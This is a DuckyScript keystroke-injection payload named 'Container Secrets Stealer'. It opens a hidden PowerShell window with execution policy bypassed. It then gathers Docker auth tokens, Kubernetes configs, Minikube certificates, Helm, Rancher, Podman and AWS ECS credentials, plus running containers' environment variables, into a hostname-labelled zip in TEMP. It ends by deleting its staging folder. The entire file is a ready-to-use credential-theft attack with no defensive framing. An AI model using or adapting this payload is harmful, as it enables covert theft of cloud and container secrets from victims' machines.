REM =============================================
REM Title: Container Secrets Stealer
REM Author: bad-antics
REM Description: Extract secrets from Docker/K8s environments
REM Category: nullsec/exfil
REM Target: Windows/Linux with Docker/K8s
REM =============================================

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 800

REM Create loot directory
STRING $d="$env:TEMP\containerloot";mkdir $d -Force|Out-Null
ENTER
DELAY 200

REM Docker config (auth tokens)
STRING if(Test-Path "$env:USERPROFILE\.docker\config.json"){cp "$env:USERPROFILE\.docker\config.json" "$d\docker_config.json"}
ENTER
DELAY 200

REM Docker compose files (may contain secrets)
STRING Get-ChildItem "$env:USERPROFILE" -Filter "docker-compose*.yml" -Recurse -ErrorAction SilentlyContinue|%{cp $_.FullName "$d\compose_$($_.Directory.Name).yml" 2>$null}
ENTER
DELAY 500

REM Kubernetes configs
STRING if(Test-Path "$env:USERPROFILE\.kube"){cp -r "$env:USERPROFILE\.kube\*" "$d\kube\" -Force}
ENTER
DELAY 300

REM Helm repositories (may have chart secrets)
STRING if(Test-Path "$env:APPDATA\helm"){cp -r "$env:APPDATA\helm" "$d\helm" -Force 2>$null}
ENTER
DELAY 200

REM Minikube certs and config
STRING if(Test-Path "$env:USERPROFILE\.minikube"){cp -r "$env:USERPROFILE\.minikube\certs" "$d\minikube_certs" -Force 2>$null;cp "$env:USERPROFILE\.minikube\config\config.json" "$d\minikube_config.json" 2>$null}
ENTER
DELAY 200

REM Kind cluster configs
STRING if(Test-Path "$env:USERPROFILE\.kube"){Get-Content "$env:USERPROFILE\.kube\config"|Out-File "$d\kubeconfig.txt"}
ENTER
DELAY 200

REM Docker Desktop settings
STRING if(Test-Path "$env:APPDATA\Docker"){cp "$env:APPDATA\Docker\settings.json" "$d\docker_desktop_settings.json" 2>$null}
ENTER
DELAY 200

REM Rancher Desktop
STRING if(Test-Path "$env:LOCALAPPDATA\rancher-desktop"){cp -r "$env:LOCALAPPDATA\rancher-desktop\config" "$d\rancher\" -Force 2>$null}
ENTER
DELAY 200

REM Podman config
STRING if(Test-Path "$env:APPDATA\containers"){cp -r "$env:APPDATA\containers" "$d\podman" -Force 2>$null}
ENTER
DELAY 200

REM AWS ECS credentials
STRING if(Test-Path "$env:LOCALAPPDATA\Amazon\ECS"){cp -r "$env:LOCALAPPDATA\Amazon\ECS" "$d\ecs" -Force 2>$null}
ENTER
DELAY 200

REM List running containers (if Docker is running)
STRING docker ps -a 2>$null|Out-File "$d\docker_containers.txt";docker images 2>$null|Out-File "$d\docker_images.txt"
ENTER
DELAY 300

REM Try to get secrets from running containers
STRING docker ps -q 2>$null|%{docker inspect $_ 2>$null}|Out-File "$d\container_inspect.txt"
ENTER
DELAY 300

REM Environment variables from containers
STRING docker ps -q 2>$null|%{$id=$_;docker exec $id env 2>$null|Out-File "$d\container_env_$id.txt"}
ENTER
DELAY 500

REM Compress
STRING Compress-Archive -Path $d -DestinationPath "$env:TEMP\containers_$(hostname).zip" -Force
ENTER
DELAY 400

STRING Remove-Item $d -Recurse -Force
ENTER

STRING exit
ENTER
